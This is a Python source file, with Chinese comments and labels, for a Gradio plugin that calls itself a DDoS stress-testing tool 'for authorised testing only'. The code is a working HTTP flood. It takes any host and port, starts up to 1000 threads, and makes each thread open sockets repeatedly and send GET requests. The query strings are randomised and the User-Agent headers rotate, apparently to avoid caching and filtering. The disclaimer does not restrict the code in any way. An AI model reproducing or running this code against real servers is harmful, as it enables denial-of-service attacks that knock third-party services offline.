"""
DDoS测试工具（仅用于合法测试）
"""
import socket
import threading
import time
import random
import gradio as gr

name = "DDoS测试"
description = "压力测试工具，用于测试服务器抗压能力（仅限授权测试）"

# 生成随机用户代理
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
]

def get_ui():
    """创建DDoS工具的UI界面"""
    with gr.Row():
        host = gr.Textbox(label="目标地址", placeholder="输入IP地址或域名")
        port = gr.Number(label="端口号", value=80, minimum=1, maximum=65535)
        threads = gr.Number(label="线程数", value=100, minimum=1, maximum=1000)
        duration = gr.Number(label="持续时间 (秒)", value=60, minimum=10, maximum=300)
    return gr.Group([host, port, threads, duration])


def run(host, port, threads, duration):
    """执行DDoS测试"""
    if not host:
        return "错误：必须输入目标地址"
    
    try:
        # 参数验证
        thread_count = int(threads)
        duration_sec = int(duration)
        
        # 创建攻击线程
        def attack():
            while True:
                try:
                    # 创建socket连接
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((host, int(port)))
                    
                    # 发送HTTP请求
                    headers = [
                        f"GET /?{random.randint(0, 2000000)} HTTP/1.1",
                        f"Host: {host}",
                        "Connection: keep-alive",
                        f"User-Agent: {random.choice(user_agents)}",
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                        "Accept-Language: en-US,en;q=0.5",
                        "Accept-Encoding: gzip, deflate",
                        ""
                    ]
                    
                    sock.send("\r\n".join(headers).encode())
                    sock.close()
                    
                except Exception as e:
                    # 错误发生时停止线程
                    break
        
        # 启动攻击线程
        active_threads = []
        for _ in range(thread_count):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            active_threads.append(t)
        
        # 等待指定时间后停止攻击
        time.sleep(duration_sec)
        
        return f"已完成DDoS测试\n目标：{host}:{port}\n线程数：{thread_count}\n持续时间：{duration_sec}秒\n注意：本工具仅用于授权压力测试"
        
    except Exception as e:
        return f"执行错误：{str(e)}"